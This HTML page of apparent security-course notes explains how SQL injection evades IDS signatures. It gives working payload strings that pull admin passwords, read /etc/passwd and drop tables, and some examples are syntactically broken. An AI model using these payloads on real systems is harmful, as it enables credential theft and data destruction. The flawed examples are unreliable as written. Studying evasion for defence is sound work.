<h1>Evasion Techniques</h1>
<p>Firewalls and IDS can detect SQL injection attempts based on predefined signatures. Attackers use evasion techniques to perform SQL injection without being detected. Even if networks include these network 
security perimeters, attackers use evasion techniques to perform SQL injection without being detected. Such evasion techniques include hex encoding, manipulating white spaces, in-line comments, sophisticated 
matches, char encoding and so on.</p>
<h2>Evading IDS</h2>
<p>To detect SQL injection, the IDS sensor is placed at the database server to inspect SQL statements. Attackers use:</p>
<p><ol>
  <ul>In-line Comment</ul>
  <ul>Char Encoding</ul>
  <ul>String Concatenation</ul>
  <ul>Obfuscated Code</ul>
  <ul>Manipulating White Spaces</ul>
  <u>Hex Encoding</u>
  <ul>Sophisticated Matches</ul>
  <ul>URL Encoding</ul>
  <ul>Null Byte</ul>
  <ul>Case Variation</ul>
  <ul>Declare Variables</ul>
  <ul>IP Fragmentation</ul>
  <ul>Variations</ul>
</ol></p>
<h2>Evasion Technique: In-line Comment</h2>
<p>An evasion technique is succesful when a signature filters white spaces in the input strings. In this technique, an attacker obfuscates the input string via in-line comments. In-line comments create SQL 
statements that are syntactically incorrect but valid and can hence bypass various input filters. </p>
<p><ol>
  <ul>'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--</ul>
  <ul>'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/ username/**/LIKE/**/'admin'--</ul>
</ol></p>
<h2>Evasion Technique: Char Encoding</h2>
<p>With the char() function, an attacker can encode a common injection variable present in the input string to avoid detection in the signature of network security measures. This char() function converts 
hexadecimal and decimal values into characters that can easily pass through SQL engine parsing. The char() function can be used for SQL injection into MySQL without double quotes.</p>
<p><ol>
  <ul>Load files in unions (string='/etc/passwd' -> ' union select 1, (load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;</ul>
  <ul>Inject without quotes (string="%") -> ' or username like char(37);</ul>
  <ul>Inject without quotes (string="root") -> ' union select * from users where login = char(114,111,111,116);</ul>
  <ul>Check for existing files (string="n.ext") -> ' and 1=(if ((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));</ul>
</ol></p>

<h2>Evasion Technique: String Concatenation</h2>
<p>A simple string can be broken into two pieces and then concatenated with a "+" sign (Oracle: ||)</p>
<p><ol>
  <ul>EXEC('DRO' + 'P T' + 'AB' + 'LE')</ul>
</ol></p>

<h2>Evasion Technique: Obfuscated Code</h2>
<p><ol>
  <ul>Wrapping</ul>
  <ul>SQL string obfuscation</ul>
</ol></p>
<p><i>Reverse(concat(if(1,char(121),2),0x74,right(left(0x567210,2),1),lower(mid('TEST',2,1)),replace(0x7074), 'pt', 'w'), char(instr(123321,33)+110)))</i></p>

<h2>Evasion Technique: Manipulating White Spaces</h2>
<p>"UNION SELECT" signature is different from "UNION (multiple spaces) SELECT"; Dropping spaces from SQL statements will not affect their execution by some SQL databases -> 'OR'1='1' (with no spaces)</p>

<h2>Evasion Technique: Hex Encoding</h2>
<p>The string 'SELECT' can be represented by the hexadecimal number 0x73656c656374 which will most likely not be detected by a signature protection system</p>
<p>DROP TABLE CreditCard = 0x44524f50205461626c652043726564697443617264</p>

<h2>Evasion Technique: Sophisticated Matches</h2>
<p>Signature matches usually succeed in catching the most common classical matches, such as "OR 1=1". These signatures are built using regular expressions, hence they try to catch as many possible variations 
of classical matches "OR 1=1" as possible. However, there are some sophisticated matches that an attacker can use to bypass the signature. These sophisticated matches are equivalent to classical matches but 
with a slight change. An attacker might use an "OR 1=1" attack that employs a string such as "OR 'john'='john'". If this doesn't work, the attacker tricks the system by adding 'N' to the second string, such as 
"OR 'john' =N'john'". This method is very useful in signature evasion, especially for evading advanced systems.</p>
<p><ol>
  <ul>OR 'john'='john'</ul>
  <ul>' OR 'microsoft' = 'micro'+'soft'</ul>
  <ul>' OR 'movies' = N'movies'</ul>
  <ul>' OR 'software' like 'soft%'</ul>
  <ul>' OR 7 > 1</ul>
  <ul>' OR 'best' > 'b'</ul>
  <ul>' OR 'whatever' IN ('whatever')</ul>
  <ul>' OR 5 BETWEEN 1 AND 7</ul>
</ol></p>

<h2>Evasion Technique: URL Encoding</h2>
<p>Normal query: ' UNION SELECT Password FROM Users_Data WHERE name='Admin'--</p>
<p>URL Encoded: %27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94</p>

<h2>Evasion Technique: Null Byte</h2>
<p>Attackers use a null byte (%00) character prior to a string to bypass the detection mechanism. Web applications use high-level languages such as PHP, ASP and so on along with C/C++ functions. However, 
in C/C++, Null characters are used to terminate strings. </p>
<p><ol>
  <ul>' UNION SELECT Password FROM Users WHERE UserName='admin'--</ul>
  <ul>%00' UNION SELECT Password FROM Users WHERE UserName='admin'--</ul>
</ol></p>
<p>Using Null byte character, an attacker can succesfully bypass an IDS and obtain the password of an admin account.</p>

<h2>Evasion Technique: Case Variation</h2>
<p><ol>
  <ul>union select user_id, password</ul>
  <ul>UNION SELECT USER_ID, PASSWORD</ul>
  <ul>UnIoN sELeCt UsEr_iD, PaSSwOrD </ul>
</ol></p>

<h2>Evasion Technique: Declare Variables</h2>
<p>UNION Select Password</p>
<p>; declare @sqlvar nvarchar(70); set @sqlvar=(N'UNI' + N'ON' + N' SELECT'+ N'Password'); EXEC(@sqlvar</p>

<h2>Evasion Technique: IP Fragmentation</h2>
<p><ol>
  <ul>Pause when sending parts of an attack in the hope that the IDS will time-out before the target computer does</ul>
  <ul>Send the packets in reverse order</ul>
  <ul>Send the packets in proper order, except for the first fragment, which is sent last</ul>
  <ul>Send the packets in proper order, except for the last fragment, which is sent first</ul>
  <ul>Send packets out of order or randomly</ul>
</ol></p>

<h2>Evasion Technique: Variation</h2>
<p>Variation is an evasion technique whereby the attacker can easily evade any comparison statement. The attacker does this by placing characters such as "' or '1'='1'" in any basic injection statement 
such as "or 1=1" or with other accepted SQL comments. The SQL interprets this as a comparison between two strings or characters instead of two numeric values. The following queries will return identical result sets:</p>
<p><ol>
  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 –-</ul>
  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 –-</ul>
  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 –-</ul>
  <ul>SELECT * FROM accounts WHERE userName = 'Bob' OR ”evade”=”ev”+”ade</ul>
</ol></p>
